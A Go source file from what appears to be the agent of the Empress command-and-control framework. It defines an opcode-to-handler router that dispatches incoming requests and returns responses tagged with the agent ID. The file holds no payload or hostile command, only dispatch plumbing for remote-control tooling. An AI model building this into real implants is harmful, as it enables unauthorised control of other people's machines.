package c2

import (
	"github.com/pygrum/Empress/config"
	"github.com/pygrum/Empress/transport"
	"strconv"
)

type Handler func(*transport.Request, *transport.Response)

type Router struct {
	handlers map[int32]Handler
}

func NewRouter() *Router {
	return &Router{
		handlers: make(map[int32]Handler),
	}
}

func (r *Router) HandleFunc(opcode int32, handler Handler) {
	r.handlers[opcode] = handler
}

func (r *Router) handle(req *transport.Request) *transport.Response {
	resp := &transport.Response{
		AgentID:   config.C.AgentID,
		RequestID: req.RequestID,
	}
	handleFunc, ok := r.handlers[req.Opcode]
	if !ok {
		resp.Responses = append(resp.Responses, transport.ResponseDetail{
			Status: transport.StatusErrorWithMessage,
			Dest:   transport.DestStdout,
			Data:   []byte("unknown opcode " + strconv.Itoa(int(req.Opcode))),
		})
		return resp
	}
	handleFunc(req, resp)
	return resp
}
